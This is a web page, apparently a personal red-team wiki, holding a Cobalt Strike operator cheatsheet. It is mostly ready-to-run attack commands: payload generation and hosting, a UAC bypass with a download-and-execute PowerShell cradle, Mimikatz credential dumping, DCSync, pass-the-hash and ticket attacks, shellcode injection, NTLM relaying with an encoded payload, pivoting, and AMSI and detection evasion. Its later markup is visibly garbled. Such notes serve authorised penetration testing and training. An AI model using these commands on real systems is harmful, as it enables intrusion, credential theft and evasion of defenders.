          <li class="md-nav__item">
  <a href="#powershell-payload" class="md-nav__link">
    <span class="md-ellipsis">
      Powershell payload
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-dll-payload" class="md-nav__link">
    <span class="md-ellipsis">
      Create dll payload
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-service-binary" class="md-nav__link">
    <span class="md-ellipsis">
      Create service binary
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#opsec-payloads" class="md-nav__link">
    <span class="md-ellipsis">
      OPSEC payloads
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#command-execution" class="md-nav__link">
    <span class="md-ellipsis">
      Command Execution
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Command Execution">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#execute-cmd-command" class="md-nav__link">
    <span class="md-ellipsis">
      Execute cmd command
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#execute-powershell-command" class="md-nav__link">
    <span class="md-ellipsis">
      Execute PowerShell command
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#execute-powershell-command-through-powerpick" class="md-nav__link">
    <span class="md-ellipsis">
      Execute PowerShell command through powerpick
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#execute-assembly-in-memory" class="md-nav__link">
    <span class="md-ellipsis">
      Execute assembly in memory
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#load-powershell-script" class="md-nav__link">
    <span class="md-ellipsis">
      Load PowerShell script
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#uac-bypass" class="md-nav__link">
    <span class="md-ellipsis">
      UAC Bypass
    </span>
  </a>
  
    <nav class="md-nav" aria-label="UAC Bypass">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#uac-bypass_1" class="md-nav__link">
    <span class="md-ellipsis">
      UAC bypass
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#uac-bypass-method-2-runasadmin" class="md-nav__link">
    <span class="md-ellipsis">
      UAC bypass method 2 runasadmin
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lateral-movement" class="md-nav__link">
    <span class="md-ellipsis">
      Lateral Movement
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Lateral Movement">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#portscan" class="md-nav__link">
    <span class="md-ellipsis">
      Portscan
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#user-impersonation" class="md-nav__link">
    <span class="md-ellipsis">
      User impersonation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="User impersonation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#make-token-runas-other-user" class="md-nav__link">
    <span class="md-ellipsis">
      Make token - runas other user
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rev2self" class="md-nav__link">
    <span class="md-ellipsis">
      Rev2self
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#steal-token" class="md-nav__link">
    <span class="md-ellipsis">
      Steal token
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


<h1 id="cobalt-strike-cheatsheet">Cobalt-Strike cheatsheet.</h1>
<h2 id="general">General</h2>
<h4 id="get-current-user">Get current user</h4>
<div class="highlight"><pre><span></span><code>getuid
</code></pre></div>
<h4 id="change-sleep-set-interactive">Change sleep / Set interactive</h4>
<ul>
<li>OPSEC Lower sleep = More traffic/Noice = More likely to get caught.
<div class="highlight"><pre><span></span><code>sleep &lt;SECONDS&gt;
sleep 0
</code></pre></div></li>
</ul>
<h4 id="get-metadata-from-beacon">Get metadata from beacon</h4>
<div class="highlight"><pre><span></span><code>checkin
</code></pre></div>
<h4 id="kill-a-beacon">Kill a beacon</h4>
<ul>
<li>Right click beacon, then Session --&gt; Exit, then Session --&gt; Eemove</li>
</ul>
<h4 id="upload-and-download-files">Upload and download files</h4>
<div class="highlight"><pre><span></span><code>upload &lt;FILE&gt;
download &lt;FILE&gt;
</code></pre></div>
<h4 id="take-screenshots">Take screenshots</h4>
<ul>
<li>View screenshot. Go to View -&gt; Screenshots
<div class="highlight"><pre><span></span><code>printscreen               Take a single screenshot via PrintScr method
screenshot                Take a single screenshot
screenwatch               Take periodic screenshots of desktop
</code></pre></div></li>
</ul>
<h4 id="keylogger">Keylogger</h4>
<div class="highlight"><pre><span></span><code>keylogger
</code></pre></div>
<h3 id="webserver">Webserver</h3>
<h4 id="upload-file">Upload file</h4>
<ul>
<li>Go to Site Management -&gt; Host File and select your document.</li>
<li>Set the Location URI, Local Host and click Launch.</li>
</ul>
<h4 id="check-web-logs">Check web logs</h4>
<ul>
<li>Go to View -&gt; Web log</li>
</ul>
<h3 id="teamserver">Teamserver</h3>
<h4 id="start-teamserver">Start teamserver</h4>
<div class="highlight"><pre><span></span><code>cd /opt/cobaltstrike
sudo ./teamserver &lt;IP&gt; &lt;PASSWORD&gt; &lt;C2 PROFILE&gt;

sudo ./teamserver &lt;IP&gt; &lt;PASSWORD&gt; c2-profiles/normal/webbug.profile
</code></pre></div>
<h3 id="teamserver-service">Teamserver service</h3>
<h4 id="create-service">Create service</h4>
<div class="highlight"><pre><span></span><code>sudo vim /etc/systemd/system/csteamserver.service

[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=/home/attacker/cobaltstrike
ExecStart=/home/attacker/cobaltstrike/teamserver &lt;IP&gt; &lt;PASSWORD&gt; &lt;C2 PROFILE&gt;

[Install]
WantedBy=multi-user.target
</code></pre></div>
<h4 id="reload-service">Reload service</h4>
<div class="highlight"><pre><span></span><code>sudo systemctl daemon-reload
sudo systemctl status csteamserver.service
</code></pre></div>
<h4 id="start-service">Start service</h4>
<div class="highlight"><pre><span></span><code>sudo systemctl start csteamserver.service
sudo systemctl status csteamserver.service
</code></pre></div>
<h4 id="enable-service">Enable service</h4>
<div class="highlight"><pre><span></span><code>sudo systemctl enable teamserver.service
</code></pre></div>
<h3 id="persistend-hosted-files">Persistend hosted files</h3>
<ul>
<li>Hosted files are gone on restart. A solution is to use <code>agscript</code> utility with the <code>artifact_payload</code> and <code>site_host</code> functions.
<div class="highlight"><pre><span></span><code>agscript &lt;HOST&gt; &lt;PORT&gt; &lt;USER&gt; &lt;PASSWORD&gt; &lt;path/to/script.cna&gt;

vim host_payloads.cna

# Connected and ready
on ready {

    # Generate payload
    $payload = artifact_payload(&quot;&lt;LISTENER NAME&gt;&quot;, &quot;&lt;PAYLOAD TYPE&gt;&quot;, &quot;&lt;PAYLOAD ARCHITECTURE&gt;&quot;);

    # Host payload
    site_host(&quot;&lt;LOCAL IP&gt;&quot;, &lt;PORT&gt;, &quot;&lt;URI&gt;&quot;, $payload, &quot;&lt;MIME TYPE&gt;&quot;, &quot;&lt;DESCRIPTION&gt;&quot;, &lt;HTTPS [true|false]&gt;);
}
</code></pre></div></li>
</ul>
<div class="highlight"><pre><span></span><code>vim host_payloads.cna

# Connected and ready
on ready {

    # Generate payload
    $payload = artifact_payload(&quot;http&quot;, &quot;powershell&quot;, &quot;x64&quot;);

    # Host payload
    site_host(&quot;10.10.5.50&quot;, 80, &quot;/a&quot;, $payload, &quot;text/plain&quot;, &quot;Auto Web Delivery (PowerShell)&quot;, false);
}
</code></pre></div>
<h4 id="add-to-startup-service">Add to startup service</h4>
<ul>
<li>Add the following line
<div class="highlight"><pre><span></span><code>sudo vim /etc/systemd/system/csteamserver.service

ExecStartPost=/bin/sh -c &#39;/usr/bin/sleep 30; /home/attacker/cobaltstrike/agscript 127.0.0.1 50050 headless Passw0rd! host_payloads.cna &amp;&#39;
</code></pre></div></li>
</ul>
<h3 id="listeners">Listeners</h3>
<h3 id="create-a-listener">Create a listener</h3>
<ul>
<li>Two type of listeners: <code>egress</code> (HTTP(S) and DNS) and <code>peer-to-peer</code> (SMB or TCP).</li>
<li><code>egress</code> listens on the teamserver IP.</li>
<li><code>peer-to-peer</code> listens on a existing beacon.    </li>
<li>In the menu click the HeadPhones Icon or click Cobalt Strike --&gt; Listeners </li>
<li>Click the Add button at the bottom and and a new listener dialogue will appear.</li>
<li>Choose a descriptive name such as <code>&lt;protocol&gt;-&lt;port&gt;</code> example: <code>http-80</code>.</li>
<li>Set the variables/settings and click Save.</li>
<li>Creating a TCP local listener is usefull for privescing or spawning new shells</li>
</ul>
<h4 id="create-peer-to-peer-listener">Create peer-to-peer listener</h4>
<ul>
<li>Creating P2P listeners can be done in the Listeners menu, by selecting the TCP or SMB Beacon payload type.</li>
<li>Then create payload for the new listener!</li>
</ul>
<h3 id="create-pivot-listener">Create pivot listener</h3>
<ul>
<li>To start a Pivot Listener on an existing Beacon, right-click Pivoting --&gt; Listener.</li>
<li>Might need to open port on the firewall</li>
</ul>
<h4 id="connect-to-pivot-listener">Connect to pivot listener</h4>
<ul>
<li>Works like a bind shell. Most used are SMB or TCP.</li>
<li>Run the payload on the target</li>
<li>Connect to the beacon with <code>link</code> for smb and <code>connect</code> for tcp.
<div class="highlight"><pre><span></span><code>connect &lt;IP&gt; &lt;PORT&gt;
link &lt;IP&gt; &lt;PIPE&gt;
</code></pre></div></li>
</ul>
<h4 id="opsec-listeners">OPSEC listeners</h4>
<ul>
<li>DNS: Since 0.0.0.0 is the default response (and also rather nonsensical), Cobalt Strike team servers can be fingerprinted in this way.  This can be changed in the Malleable C2 profile.</li>
<li>SMB: The default pipe name(<code>msagent_XX</code>) is quite well signatured. A good strategy is to emulate names known to be used by common applications or Windows itself.  Use <code>ls \\.\pipe\</code> to list all currently listening pipes for inspiration.  </li>
</ul>
<h3 id="payloads">Payloads</h3>
<h4 id="create-payloads">Create payloads</h4>
<ul>
<li>Click Payloads --&gt; Select an option or all</li>
</ul>
<h4 id="powershell-payload">Powershell payload</h4>
<ul>
<li>Click Attacks --&gt; Scripted web delivery (S) --&gt; Choose a URI path, listener and select type PowerShell IEX</li>
</ul>
<h4 id="create-dll-payload">Create dll payload</h4>
<ul>
<li>Bypasses default applocker configuration
<div class="highlight"><pre><span></span><code>C:\Windows\System32\rundll32.exe C:\Users\Administrator\Desktop\beacon.dll,StartW
link &lt;COMPUTERNAME&gt;
</code></pre></div></li>
</ul>
<h4 id="create-service-binary">Create service binary</h4>
<ul>
<li>Used for privilege escalation with services</li>
<li>Attacks --&gt; Packages --&gt; Windows Executable (S) and selecting the Service Binary output type.</li>
<li>TIP:  I recommend the use of TCP beacons bound to localhost only with privilege escalations</li>
</ul>
<h4 id="opsec-payloads">OPSEC payloads</h4>
<ul>
<li>Staged payloads are good if your delivery method limits the amount of data you can send. However, they tend to have more indicators compared to stageless. Given the choice, go stageless.</li>
<li>The use of 64-bit payloads on 64-bit Operating Systems is preferable to using 32-bit payloads on 64-bit Operating Systems.</li>
</ul>
<h2 id="command-execution">Command Execution</h2>
<h4 id="execute-cmd-command">Execute cmd command</h4>
<div class="highlight"><pre><span></span><code>run &lt;COMMAND&gt;
</code></pre></div>
<h4 id="execute-powershell-command">Execute PowerShell command</h4>
<div class="highlight"><pre><span></span><code>powershell &lt;COMMAND&gt;
</code></pre></div>
<h4 id="execute-powershell-command-through-powerpick">Execute PowerShell command through powerpick</h4>
<ul>
<li>Bypasses Constrained Language Mode
<div class="highlight"><pre><span></span><code>powerpick $ExecutionContext.SessionState.LanguageMode
</code></pre></div></li>
</ul>
<h4 id="execute-assembly-in-memory">Execute assembly in memory</h4>
<div class="highlight"><pre><span></span><code>execute-assembly &lt;PATH TO EXE&gt;
</code></pre></div>
<h4 id="load-powershell-script">Load PowerShell script</h4>
<div class="highlight"><pre><span></span><code>powershell-import &lt;FILE&gt;
</code></pre></div>
<h2 id="uac-bypass">UAC Bypass</h2>
<ul>
<li>https://github.com/cobalt-strike/ElevateKit</li>
</ul>
<h4 id="uac-bypass_1">UAC bypass</h4>
<ul>
<li>Typing <code>elevate</code> and then tab lets you cycle through the methods.
<div class="highlight"><pre><span></span><code>elevate &lt;METHOD&gt; &lt;LISTENER&gt;
elevate uac-schtasks tcp-local
</code></pre></div></li>
</ul>
<h4 id="uac-bypass-method-2-runasadmin">UAC bypass method 2 runasadmin</h4>
<div class="highlight"><pre><span></span><code>runasadmin uac-cmstplua powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://10.10.5.120:80/b&#39;))&quot;
connect localhost 4444
</code></pre></div>
<h2 id="lateral-movement">Lateral Movement</h2>
<h4 id="portscan">Portscan</h4>
<div class="highlight"><pre><span></span><code>portscan &lt;IP OR RANGE&gt; &lt;PORTS&gt;
</code></pre></div>
<h3 id="user-impersonation">User impersonation</h3>
<h4 id="make-token-runas-other-user">Make token - runas other user</h4>
<div class="highlight"><pre><span></span><code>make_token &lt;DOMAIN&gt;\&lt;USER&gt; &lt;PASSWORD&gt;
</code></pre></div>
<h4 id="rev2self">Rev2self</h4>
<ul>
<li>Drops impersonation and will undo the make token
<div class="highlight"><pre><span></span><code>rev2self
</code></pre></div></li>
</ul>
<h4 id="steal-token">Steal token</h4>
<ul>
<li>If a user is running a process on the system, we can steal its process
<div class="highlight"><pre><span></span><code>steal_token &lt;PID&gt;
````

#### Inject payload into process
</code></pre></div>
inject <PID> <ARCH> <BEACON>
<div class="highlight"><pre><span></span><code>#### Spawnas
- Will spawn a new process using the plaintext credentials of another user and inject a Beacon payload into it.
- Must be run from a folder the user has access to.
- This command does not require local admin privileges and will also usually fail if run from a SYSTEM Beacon.
</code></pre></div>
make_token <DOMAIN>\<USER> <PASSWORD>
spawnas <DOMAIN>\<USER> <PASSWORD> <BEACON>
<div class="highlight"><pre><span></span><code>#### Pass the hash
</code></pre></div>
pth <DOMAIN>\<USER> <NTLM HASH>
<div class="highlight"><pre><span></span><code>
</code></pre></div>
mimikatz sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM> /run:"powershell -w hidden"
steal_token <PID>
<div class="highlight"><pre><span></span><code>#### Pass the ticket
- OPSEC: By default, Rubeus will use a random username, domain and password with CreateProcessWithLogonW, which will appear in the associated 4624 logon event.  The &quot;Suspicious Logon Events&quot; saved search will show 4624&#39;s where the TargetOutboundDomainName is not an expected value.
</code></pre></div>
execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:<DOMAIN> /username:<USER> /password:FakePass123</li>
</ul>
<p>execute-assembly Rubeus.exe ptt /luid:<LUID FROM PREVIOUS COMMAND> /ticket:<BASE64 TICKET></p>
<p>steal_token <PID OF FIRST COMMAND>
<div class="highlight"><pre><span></span><code>#### Overpass the hash
- OPSEC: Use AES256 keys
</code></pre></div>
execute-assembly Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /rc4:<NTLM HASH> /nowrap
execute-assembly Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES256 HASH> /nowrap /opsec</p>
<p>make_token <DOMAIN>\<USER> DummyPass</p>
<p>kerberos_ticket_use C:\Users\public\ticket.kirbi</p>
<p>ls \<HOSTNAME>\c$
<div class="highlight"><pre><span></span><code>#### Overpass the hash elevated context
</code></pre></div>
execute-assembly Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES256 HASH> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe</p>
<h1 id="output-processid">output: [+] ProcessID       : <PID></h1>
<p>steal_token <PID></p>
<p>ls \<HOSTNAME>\c$
<div class="highlight"><pre><span></span><code>#### Extract and inject ticket, then steal token
- Extract tickets of a user, create new process, inject ticket into process, steal token from the process
</code></pre></div>
execute-assembly Rubeus.exe triage
execute-assembly Rubeus.exe dump /service:krbtgt /luid:<LUID> /nowrap
execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
execute-assembly Rubeus.exe ptt /luid:<LUID> /ticket:[...base64-ticket...]
steal_token <PID>
<div class="highlight"><pre><span></span><code>#### Load TGT or TGS ticket
</code></pre></div>
kerberos_ticket_use <FILE TO TICKET>
<div class="highlight"><pre><span></span><code>#### Use ccache file
</code></pre></div>
kerberos_ccache_use
<div class="highlight"><pre><span></span><code>### Techniques
#### Jump
</code></pre></div>
jump [method] [target] [listener]</p>
<pre><code>Exploit                   Arch  Description
-------                   ----  -----------
psexec                    x86   Use a service to run a Service EXE artifact
psexec64                  x64   Use a service to run a Service EXE artifact
psexec_psh                x86   Use a service to run a PowerShell one-liner
winrm                     x86   Run a PowerShell script via WinRM
winrm64                   x64   Run a PowerShell script via WinRM
</code></pre>
<p>```
</p>
<h4 id="remote-exec">Remote-exec</h4>
<p>```
remote-exec [method] [target] [command]</p>
<pre><code>psexec                          Remote execute via Service Control Manager
winrm                           Remote execute via WinRM (PowerShell)
wmi                             Remote execute via WMI
</code></pre>
<p>```
</p>
<h3 id="custom">Custom</h3>
<ul>
<li>Use primitives such as <code>powershell</code>, <code>execute-assembly</code>, etc to implement something custom with for example an agressor script.
</li>
</ul>
<h4 id="getting-the-architecture">Getting the architecture</h4>
<ul>
<li>for winrm or winrm64 with jump
<code>remote-exec winrm &lt;HOSTNAME&gt; (Get-WmiObject Win32_OperatingSystem).OSArchitecture</code>
</li>
</ul>
<h4 id="jump-winrm">Jump winrm</h4>
<p><code>jump winrm64 &lt;HOSTNAME&gt; &lt;LISTENER&gt;</code>
</p>
<h3 id="jump-psexec">Jump PSexec</h3>
<p><code>jump psexec64 &lt;HOSTNAME&gt; &lt;LISTENER&gt;</code>
</p>
<h3 id="wmi">WMI</h3>
<ul>
<li>Not a jump command but can be used manually</li>
<li>Make sure the firewall is open for the ports used!
<code>cd \\&lt;HOSTNAME&gt;\ADMIN$
upload &lt;SMB BEACON EXE&gt;
remote-exec wmi &lt;HOSTNAME&gt; &lt;BEACON EXE&gt;
link &lt;HOSTNAME&gt; &lt;PIPE&gt;</code>

<code>cd \\&lt;HOSTNAME&gt;\ADMIN$
upload &lt;TCP BEACON EXE&gt;
remote-exec wmi &lt;HOSTNAME&gt; &lt;BEACON EXE&gt;
connect &lt;HOSTNAME&gt; &lt;PORT&gt;</code>
</li>
</ul>
<h4 id="wmi-exec-commands">WMI exec commands</h4>
<p><code>remote-exec winrm &lt;HOSTNAME&gt; whoami; hostname</code>
</p>
<h4 id="coinitializesecurity">CoInitializeSecurity</h4>
<ul>
<li>Beacon's internal implementation of WMI uses a Beacon Object File, executed using the beacon_inline_execute Aggressor function. When a BOF is executed the CoInitializeSecurity COM object can be called, which is used to set the security context for the current process. According to Microsoft's documentation, this can only be called once per process. The unfortunate consequence is that if you have CoInitializeSecurity get called in the context of, say "User A", then future BOFs may not be able to inherit a different security context ("User B") for the lifetime of the Beacon process.</li>
<li>if CoInitializeSecurity has already been called, WMI fails with access denied.</li>
<li>As a workaround, your WMI execution needs to come from a different process. This can be achieved with commands such as spawn and spawnas, or even execute-assembly with a tool such as SharpWMI.

<code>remote-exec wmi &lt;HOSTNAME&gt; calc.exe
execute-assembly SharpWMI.exe action=exec computername=&lt;HOSTNAME&gt; command="C:\Windows\System32\calc.exe"</code>
</li>
</ul>
<h4 id="dcom">DCOM</h4>
<ul>
<li>https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1
<code>powershell-import Invoke-DCOM.ps1
powershell Invoke-DCOM -ComputerName &lt;HOSTNAME&gt; -Method MMC20.Application -Command &lt;BEACON EXE&gt;</code>
</li>
</ul>
<h4 id="ssh">SSH</h4>
<p><code>ssh
ssh-key</code>
</p>
<h2 id="post-exploitation">Post Exploitation</h2>
<h3 id="credentials">Credentials</h3>
<ul>
<li>The <code>!</code>(Elevate to system) and <code>@</code>(Impersonate beacons thread) symbols are modifiers.</li>
<li>Go to View -&gt; Credentials to see a copy of all the credentials
</li>
</ul>
<h4 id="mimikatz-logonpasswords">Mimikatz logonpasswords</h4>
<p><code>mimikatz !sekurlsa::logonpasswords
logonpasswords</code>
</p>
<h4 id="mimikatz-ekeys">Mimikatz ekeys</h4>
<p><code>mimikatz !sekurlsa::ekeys</code>
</p>
<h4 id="mimikatz-sam">Mimikatz sam</h4>
<p><code>mimikatz !lsadump::sam</code>
</p>
<h4 id="mimikatz-cached-credentials">Mimikatz Cached Credentials</h4>
<p><code>mimikatz !lsadump::cache</code>
</p>
<h4 id="dcsync">DCSync</h4>
<p><code>dcsync &lt;DOMAIN&gt; &lt;DOMAIN\USER&gt;</code>
</p>
<h3 id="session-passing">Session passing</h3>
<h4 id="beacon-passing">Beacon passing</h4>
<ul>
<li>From one beacon type to another</li>
<li>Spawn an process and inject shellcode for the specified listener into it.
<code>spawn &lt;ARCHITECTURE&gt; &lt;LISTENER&gt;</code>
</li>
</ul>
<h4 id="cobalt-strike-metasploit">Cobalt strike --&gt; Metasploit</h4>
<ul>
<li>Only supports <code>x86</code>
<code>sudo msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set LHOST eth0
set LPORT &lt;PORT&gt;
exploit -j</code></li>
<li>Go to Listeners --&gt; Add and set the Payload to Foreign HTTP. Set the Host, the Port, Set the name to <code>msf</code> and click Save. The command <code>spawn msf</code> will pass the session to metasploit.
<code>spawn msf</code>
</li>
</ul>
<h4 id="cobalt-strike-metasploit-shellcode-shinject-new-process">Cobalt strike --&gt; Metasploit shellcode shinject new process</h4>
<p>```
sudo msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_http
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=8080 -f raw -o /tmp/msf.bin</p>
<p>execute C:\Windows\System32\notepad.exe
ps
shinject <PID> x64 msf.bin
<div class="highlight"><pre><span></span><code>#### Cobalt strike --&gt; Metasploit shellcode shspawn new process
</code></pre></div>
sudo msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_http
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=8080 -f raw -o /tmp/msf_http_x64.bin</p>
<p>shspawn x64 C:\Payloads\msf_http_x64.bin
<div class="highlight"><pre><span></span><code>### Metasploit --&gt; Cobalt strike
- Go to Attacks --&gt; Packages --&gt; Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
</code></pre></div>
use post/windows/manage/shellcode_inject
set SESSION 1
set SHELLCODE /tmp/beacon.bin
run
<div class="highlight"><pre><span></span><code>## Pivoting
### Socksproxy
#### Enable Socksproxy no auth
- OPSEC: This binds the port on all interfaces and since there is no authentication available on SOCKS4, this port can technically be used by anyone
</code></pre></div>
socks <PORT> <SOCKS4/SOCKS5>
<div class="highlight"><pre><span></span><code>#### Enable Socksproxy auth
- The enableLogging option sends additional logs (such as authentication failures) to the VM console, which you unfortunately can&#39;t see easily when the team server running as a service.  Instead, you can use journalctl:
</code></pre></div>
socks <PORT> socks5 disableNoAuth <USER> <PASS> enableLogging
<div class="highlight"><pre><span></span><code>### Using proxychains
#### Proxychains
- For linux
- Change proxychains config `socks5 &lt;IP&gt; &lt;PORT&gt; &lt;USER&gt; &lt;PASS&gt;`
</code></pre></div>
sudo vim /etc/proxychains.conf
proxychains <COMMAND>
<div class="highlight"><pre><span></span><code>#### Proxifier
- https://www.proxifier.com/
- For windows
- Open Proxifier, go to Profile -&gt; Proxy Servers and Add a new proxy entry, which will point at the IP address and Port of your Cobalt Strike SOCKS proxy.
- Next, go to Profile -&gt; Proxification Rules. This is where you can add rules that tell Proxifier when and where to proxy specific applications. Multiple applications can be added to the same rule, but in this example, I&#39;m creating a single rule for adexplorer64.exe (part of the Sysinternals Suite).
- Target hosts fill in the target internal network range with the action ```proxy socks &lt;TARGET&gt;```
- NOTE: You will also need to add a static host entry in `C:\Windows\System32\drivers\etc\hosts` file: `&lt;DC IP&gt; &lt;DOMAIN&gt;`. You can enable DNS lookups through Proxifier, but that will cause DNS leaks from your computer into the target environment.

#### Proxychains netonly or overpass the hash
</code></pre></div>
runas /netonly /user:<DOMAIN>\<USER> "C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:"C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
<div class="highlight"><pre><span></span><code>#### Browser
- Install FoxyProxy https://getfoxyproxy.org/
- Configure Proxy IP and port, Username and Password.
- NTLM auth: https://offensivedefence.co.uk/posts/ntlm-auth-firefox/

#### Metasploit
- In Cobalt Strike, go to View &gt; Proxy Pivots, highlight the existing SOCKS proxy and click the Tunnel button. 
- Paste string in msfconsole
- Stop with ```socks stop```

### Manual port forwards
#### Remote port forward netsh
- Requires administrator privs
</code></pre></div>
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=<PORT> connectaddress=<TARGET IP> connectport=<TARGET PORT> protocol=tcp
<div class="highlight"><pre><span></span><code>#### List forwards netsh
</code></pre></div>
netsh interface portproxy show v4tov4
<div class="highlight"><pre><span></span><code>#### Remove port forward netsh
</code></pre></div>
netsh interface portproxy delete v4tov4 listenaddress=<IP> listenport=<PORT>
<div class="highlight"><pre><span></span><code>### Rportfwd
#### Create port forward
- Beacon&#39;s reverse port forward always tunnels the traffic to the Team Server and the Team Server sends the traffic to its intended destination, so shouldn&#39;t be used to relay traffic between individual machines.
- Does not require administrator privs
- OPSEC: When the Windows firewall is enabled, it will prompt the user with an alert when an application attempts to listen on a port that is not explicitly allowed.  Allowing access requires local admin privileges and clicking cancel will create an explicit block rule. Have to create firewall rule first!
</code></pre></div>
powershell New-NetFirewallRule -DisplayName "Test Rule" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort <PORT></p>
<p>rportfwd <PORT> <IP> <PORT>
<div class="highlight"><pre><span></span><code>#### Stop and remove firewall rule
</code></pre></div>
powershell Remove-NetFirewallRule -DisplayName "Test Rule"</p>
<p>rportfwd stop <PORT>
<div class="highlight"><pre><span></span><code>#### Create port forward rportfwd_local
- Beacon also has a rportfwd_local command.  Whereas rportfwd will tunnel traffic to the Team Server, rportfwd_local will tunnel the traffic to the machine running the Cobalt Strike client.
- Does not require administrator privs
- If 127.0.0.1 doesn&#39;t work use teamserver IP
</code></pre></div>
rportfwd_local <PORT> <IP> <PORT>
<div class="highlight"><pre><span></span><code>#### Stop port forward local
</code></pre></div>
rportfwd_local stop <PORT>
<div class="highlight"><pre><span></span><code>### NTLMRelaying with cobalt strike
- https://github.com/praetorian-inc/PortBender
- Requires system privs

#### Place portbender driver on the target
</code></pre></div>
cd C:\Windows\system32\drivers
upload WinDivert64.sys
<div class="highlight"><pre><span></span><code>#### Load portbender.cna
- Load `PortBender.cna` this adds a new PortBender command to the console in Cobalt strike -&gt; Script Manager
- Breaks SMB service on the machine, also SMB Beacons. 
- Create the appropriate inbound firewall rules for 445 (file sharing is disabled by default), 8445, and 8080.
</code></pre></div>
help PortBender
PortBender redirect 445 8445
<div class="highlight"><pre><span></span><code>#### Create port forward
- Create a reverse port forward that will then relay the traffic from port 8445 to port 445 on the Team Server (where ntlmrelayx will be waiting).
</code></pre></div>
rportfwd 8445 127.0.0.1 445
<div class="highlight"><pre><span></span><code>#### Allow 8445 firewall
</code></pre></div>
powershell New-NetFirewallRule -DisplayName "Test Rule" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8445
<div class="highlight"><pre><span></span><code>#### Create sockx proxy
</code></pre></div>
socks 1080 socks5 disableNoAuth socks_user socks_password
<div class="highlight"><pre><span></span><code>#### NTLMRelay execute command
</code></pre></div>
sudo proxychains ntlmrelayx.py -t smb://<TARGET IP> -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc <PAYLOAD>'
<div class="highlight"><pre><span></span><code>#### Stop portbender
</code></pre></div>
jobs
jobkill <JID>
kill <PID>
<div class="highlight"><pre><span></span><code>## Evasion
### Malleable C2 profile
- Example: https://github.com/Cobalt-Strike/Malleable-C2-Profiles
- Changes to C2 profile requires teamserver restart and a new beacon!
- Good changes: https://github.com/WKL-Sec/Malleable-CS-Profiles

#### Check profile for errors
</code></pre></div>
./c2lint <PROFILE>
<div class="highlight"><pre><span></span><code>### Amsi bypass
#### Add the following to the .profile
- `amsi_disable` only applies to `powerpick`, `execute-assembly` and `psinject`.  It does not apply to the powershell command
</code></pre></div>
post-ex {
    set amsi_disable "true";
}
<div class="highlight"><pre><span></span><code>### Spawnto
- `rundll32` being the default `spawnto` for Cobalt Strike is a common point of detectiom.
- The process used for post-ex commands and psexec can be changed on the fly in the CS GUI. 

#### Change spawnto
</code></pre></div>
spawnto x64 %windir%\sysnative\dllhost.exe
spawnto x86 %windir%\syswow64\dllhost.exe
<div class="highlight"><pre><span></span><code>#### Revert spawnto
</code></pre></div>
spawnto
<div class="highlight"><pre><span></span><code>#### Change spawnto psexec
</code></pre></div>
ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe
<div class="highlight"><pre><span></span><code>#### Change service name for psexec
</code></pre></div>
ak-settings service <NAME>
<div class="highlight"><pre><span></span><code>#### C2 profile
</code></pre></div>
post-ex {
        set amsi_disable "true";</p>
<pre><code>    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
</code></pre>
<p>}
```
</p>
